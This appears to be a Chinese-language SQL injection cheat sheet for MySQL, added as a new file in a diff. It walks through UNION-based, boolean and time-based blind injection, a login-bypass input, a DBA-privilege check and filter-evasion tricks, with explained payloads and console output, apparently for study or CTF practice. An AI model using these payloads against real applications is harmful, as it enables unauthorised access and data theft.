@@ -1,0 +1,198 @@
+第一步：ORDER BY判断字段数
+ORDER BY 10-- -
+
+第二步：UNION SELECT查询
+union select 1,2,3-- -
+union select concat(database(),current_user,version()),2,3-- -
+
+获取用户
+[PAYLOAD] 1' AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(GRANTEE AS CHAR),0x20)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1),13,1))>1 AND 'ZohU'='ZohU
+
+时间注入
+id=1' AND SLEEP(5) AND 'vMCC'='vMCC
+
+where条件下用order by判断字段数
+order by后面跟的为字段数量，依次递增，直到报错就为正确字段数。
+mysql>  select * from users where user_id = 1 order by 1,2,3,4,5,6,7,8,9;
+ERROR 1054 (42S22): Unknown column '9' in 'order clause'
+
+limit后可以利用 1,into @,@ （@为字段数）判断字段数，@为mysql临时变量。
+mysql>  select * from users limit 1,1 into @,@,@,@,@,@,@,@;
+Query OK, 1 row affected (0.01 sec)
+
+mysql>  select * from users limit 1 into @,@,@,@,@,@,@,@;
+Query OK, 1 row affected (0.00 sec)
+
+在or条件下前后如果都为真则返回所有结果，否则只返回条件为真的一方的值
+mysql>  select * from users where user_id = 1 or '1' = '1';返回全部记录
+mysql>  select * from users where user_id = 1 or '1' = '2';只返回id为1的记录
+
+MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL。
+mysql> select concat('1','2',null);返回NULL
+
+concat_ws的第一个参数为字符串连接分隔符
+和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL
+mysql> select concat_ws('分隔符','1','2',3,'select',null);
+返回结果：1分隔符2分隔符3分隔符select
+mysql> select concat_ws('空格','select','*','user','tables',null);
+返回结果：select * user tables
+
+表单认证绕过
+"SELECT username FROM users WHERE username='$username' AND password='$password'"
+这样的直接username=admin'#即可，或者username='='&password='='这样就能构造出
+"SELECT username FROM users WHERE username=''='' AND password=''=''"
+
+show databases;
+show tables;
+desc tables;
+
+select table_name from information_schema.tables where table_schema = "security";
+
+mysql> Select column_name from information_schema.columns where table_name='users';
+
+union注入时，两个sql语句进行union联合操作时，首先要保证第一个sql语句的返回值为空，这样我们注入的sql查询语句返回的数据才能在原本显示第一条sql的地方显示出来我们查询的内容。如果第一个查询语句返回了数据，那么我们注入的sql语句将不会被显示出内容。
+
+SELECT username, password FROM users WHERE username=("admin这里是一个不存在的用户") union select database(),version()-- -") and password=("") LIMIT 0,1
+
+判断是否为dba
+1' AND (SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x6d656f6469373433 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))=1-- Hzib
+
+0x6d656f6469373433为用户名的十六进制编码，也可以写为‘root’
+0x59的字符串为Y，super_priv的类型为枚举enum('N','Y')成功返回Y，失败返回N
+-- Hzib注释掉后面的语句-- -
+mysql> SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user where User = 'root' limit 0,1)='Y') THEN 1 ELSE 0 END);
+CASE WHEN...THEN 1 ELSE 0 END如果root用户为dba权限则返回1，否则返回0
+
+[PAYLOAD] 1' AND ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1))>64 AND 'GDMD'='GDMD
+
+mysql> SELECT CURRENT_USER();
++----------------+
+| CURRENT_USER() |
++----------------+
+| root@localhost |
++----------------+
+1 row in set (0.00 sec)
+
+CAST函数将
+SELECT ORD('i');
+ORD() 函数返回字符串第一个字符的 ASCII 值。
+
+SELECT MID(User,1,1) FROM mysql.user;返回用户名的第一个字符
+SELECT MID(ColumnName, Start [, Length]) FROM TableName
+注：字符串从1开始，而非0，Length是可选项，如果没有提供，MID()函数将返回余下的字符串。
+MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1)
+
+IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)
+
+(CAST(CURRENT_USER() AS CHAR)
+
+获取当前用户
+[PAYLOAD] 1' AND ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1))>64 AND 'GDMD'='GDMD
+
+第一步：CURRENT_USER()取得当前用户
+mysql> SELECT CURRENT_USER();
++----------------+
+| CURRENT_USER() |
++----------------+
+| root@localhost |
++----------------+
+1 row in set (0.00 sec)
+
+第二步：CAST对CURRENT_USER()返回的结果进行类型转换CHAR
+mysql> SELECT CAST(CURRENT_USER() AS CHAR);
++------------------------------+
+| CAST(CURRENT_USER() AS CHAR) |
++------------------------------+
+| root@localhost               |
++------------------------------+
+1 row in set (0.00 sec)
+
+第三步：IFNULL判断CAST(CURRENT_USER() AS CHAR)的返回值是否为空
+mysql> SELECT IFNULL(CAST(CURRENT_USER() AS CHAR),0x20);
++-------------------------------------------+
+| IFNULL(CAST(CURRENT_USER() AS CHAR),0x20) |
++-------------------------------------------+
+| root@localhost                            |
++-------------------------------------------+
+1 row in set (0.00 sec)
+
+第四步：MID()函数返回第一个当前用户名的第一个字符
+mysql> SELECT MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1);
++------------------------------------------------------+
+| MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1) |
++------------------------------------------------------+
+| r                                                    |
++------------------------------------------------------+
+1 row in set (0.00 sec)
+
+第五步：ORD() 函数返回字符串第一个字符的 ASCII 值
+mysql> SELECT ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1));
++-----------------------------------------------------------+
+| ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1)) |
++-----------------------------------------------------------+
+|                                                       114 |
++-----------------------------------------------------------+
+1 row in set (0.00 sec)
+
+第六步：ASCII 值比较，成功返回1，否则返回0
+mysql> SELECT ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1))>64;
++--------------------------------------------------------------+
+| ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1))>64 |
++--------------------------------------------------------------+
+|                                                            1 |
++--------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+第七步：AND 'GDMD'='GDMD 恒为真
+
+测试：
+		'
+		'-- -
+		')-- -
+		'))-- -
+		or '1'='1'
+		or '1'='1
+		1-- -
+
+
+		Select *	from a where id = 1; select *	from flag;
+		Select *	from xx where id = 1 union select *	from flag
+盲注
+id=1 and 1=1
+id=1 and 1=2
+id=1 and 1<substring((select flag from flag),1,1)
+O(256^n) -> O(n*log(256))
+
+基于错误
+• If else
+• Case . When than else end
+• Sleep
+• pg_sleep
+• Benchmark
+• Wait for delay
+• Wait for time
+
+基于错误
+• floor
+• extractvalue
+• updatexml
+• multipoint
+• cast
+• convert
+• xmltype
+
+1.数字型注入其变量没有被单引号括住，后面可以直接跟注入语句
+2.字符型和搜索型注入其变量都有单引号或者双引号、括号括住的，需要先闭合后在跟注入语句。
+
+PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除
+
+mysql中的一些替代函数和字符
+
+MID 代替 SUBSTRING
+LIKE 代替 =
+/**/ 代替 空格
+CURRENT_USER 代替 CURRENT_USER()
+" 代替 '
+
+最终例子:
+444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
